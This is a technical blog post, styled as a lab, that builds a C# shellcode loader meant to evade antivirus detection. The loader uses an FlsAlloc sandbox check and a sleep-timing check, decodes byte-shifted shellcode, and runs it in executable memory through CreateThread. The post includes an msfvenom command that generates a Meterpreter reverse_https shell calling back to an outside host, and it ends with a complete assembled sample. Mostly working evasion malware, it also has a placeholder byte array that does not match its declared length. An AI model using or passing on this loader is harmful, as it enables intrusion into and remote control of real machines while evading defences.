---
title: "Bypassing Antivirus Detection with Unusual Windows APIs, Delayed Timers, and Encryption"
seoTitle: "Antivirus Evasion with Windows APIs and Delayed Execution"
description: "A technical walkthrough of Windows sandbox-evasion primitives using FlsAlloc, delayed execution, Caesar encoding, and in-memory code execution."
deck: "A controlled lab study of unusual Windows APIs, execution delays, and lightweight encoding as building blocks for studying defensive blind spots."
slug: "bypassing-antivirus-detection-with-unusual-windows-apis-delayed-timers-and-encryption"
file: "04"
publishedAt: "2025-03-31T06:32:56.862Z"
updatedAt: "2026-08-20T16:00:00.000Z"
category: "Offensive Research"
tags:
  - "Windows"
  - "AV Evasion"
  - "FlsAlloc"
  - "Offensive Security"
coverImage: "/images/posts/windows-av-evasion-cover.webp"
coverImageAlt: "Windows process and memory illustration for an antivirus-evasion research lab"
coverImageWidth: 1792
coverImageHeight: 1024
status: "Published"
draft: false
---
This lab builds a C# console application around three evasion primitives: execution delays, the less commonly emulated `FlsAlloc` API, and Caesar cipher encoding. The implementation is developed one component at a time so each behavior can be observed independently.

## Step 1: Set up the project

Create a C# console application in Visual Studio using either "Console App (.NET Core)" or "Console App (.NET Framework)."

Add the namespaces and import the required functions from `kernel32.dll` with `DllImport`.

```csharp
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint FlsAlloc(IntPtr lpCallback);

        static void Main(string[] args)
        {
            // Main logic will go here
        }
    }
}
```

## Step 2: Check FlsAlloc

`FlsAlloc` allocates a fiber local storage (FLS) index. Some sandbox environments do not emulate this API correctly, so its return value can provide one signal about the execution environment.

The first check allocates an FLS index and exits if the call fails:

```csharp
static void Main(string[] args)
{
    uint flsIndex = FlsAlloc(IntPtr.Zero);
    if (flsIndex == 0xFFFFFFFF) // FLS_OUT_OF_INDEXES
    {
        return;
    }

    // Proceed with the simulation detection logic here
    // This part is illustrative. Real detection logic needs to be more sophisticated
    // and tailored to the specific behaviors of simulated environments.
}
```

## Step 3: Measure a sleep interval

Some analysis environments shorten sleep calls. Measuring the elapsed time catches that behavior in this sample.

The program requests a two-second delay and exits if less than 1.5 seconds elapsed:

```csharp
DateTime t1 = DateTime.Now;
Sleep(2000); // Sleep for 2 seconds
double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
if (t2 < 1.5)
{
    return;
}
```

## Step 4: Decode the payload

The sample stores each payload byte with an offset of two, then subtracts that offset at runtime.

Generate the shellcode with `msfvenom`:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.1 LPORT=443 -f csharp
```

Decode the byte array before copying it into memory:

```csharp
byte[] buf = new byte[687] { 0xfe, 0xb7, 0xa4, 0x58, 0x01, 0xd7 }; // Example byte array

for (int i = 0; i < buf.Length; i++)
{
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF); // Shift each byte by 2 positions
}
```

## Step 5: Allocate memory and execute the payload

`VirtualAlloc` creates the memory region, `Marshal.Copy` writes the decoded bytes, and `CreateThread` starts execution:

```csharp
int size = buf.Length;
IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
Marshal.Copy(buf, 0, addr, size);

IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
WaitForSingleObject(hThread, 0xFFFFFFFF);
```

`WaitForSingleObject` keeps the process alive until the thread completes.

## Complete sample

The complete sample combines the FLS check, timing check, payload decoding, and in-memory execution:

```csharp
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint FlsAlloc(IntPtr lpCallback);

        static void Main(string[] args)
        {
            uint flsIndex = FlsAlloc(IntPtr.Zero);
            if (flsIndex == 0xFFFFFFFF) // FLS_OUT_OF_INDEXES
            {
                return;
            }

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            byte[] buf = new byte[687] { 0xfe, 0xb7, 0xa4, 0x58, 0x01, 0xd7 };
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
            }

            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
